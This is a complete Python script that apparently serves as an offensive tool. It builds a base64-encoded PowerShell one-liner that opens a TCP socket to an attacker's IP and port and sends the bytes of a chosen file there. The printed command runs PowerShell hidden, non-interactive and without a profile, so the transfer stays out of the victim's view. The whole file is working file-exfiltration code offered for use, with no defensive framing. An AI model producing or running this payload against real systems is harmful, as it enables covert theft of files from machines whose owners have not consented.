#!/usr/bin/python3
import base64
import sys

def generate_payload(file_path, ip, port):
    # Escape backslashes for the PowerShell string literal
    escaped_path = file_path.replace('\\', '\\\\')
    # Payload to transfer file
    ps_script = f"""
    $client = New-Object System.Net.Sockets.TcpClient('{ip}', {port});
    $stream = $client.GetStream();
    [byte[]]$bytes = [System.IO.File]::ReadAllBytes('{escaped_path}');
    $stream.Write($bytes, 0, $bytes.Length);
    $stream.Close();
    $client.Close();
    """
    
    encoded_bytes = ps_script.encode('utf-16le') # encode chars for PowerShell
    base64_payload = base64.b64encode(encoded_bytes).decode('utf-8')
    
    return base64_payload

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print(f"\n[+] Usage: python3 {sys.argv[0]} <FILE_PATH> <ATTACKER_IP> <PORT>\n")
        print(f"[*] E.g. : python3 {sys.argv[0]} 'C:\\Windows\\Temp\\test.txt' 10.10.10.10 443")
        sys.exit(1)
        
    file_path = sys.argv[1]
    attacker_ip = sys.argv[2]
    target_port = sys.argv[3]
    
    payload = generate_payload(file_path, attacker_ip, target_port)
    
    print("\n[+] Generated PowerShell Encoded Command:\n")
    print(f"powershell -NoP -sta -NonI -W Hidden -e {payload}\n")
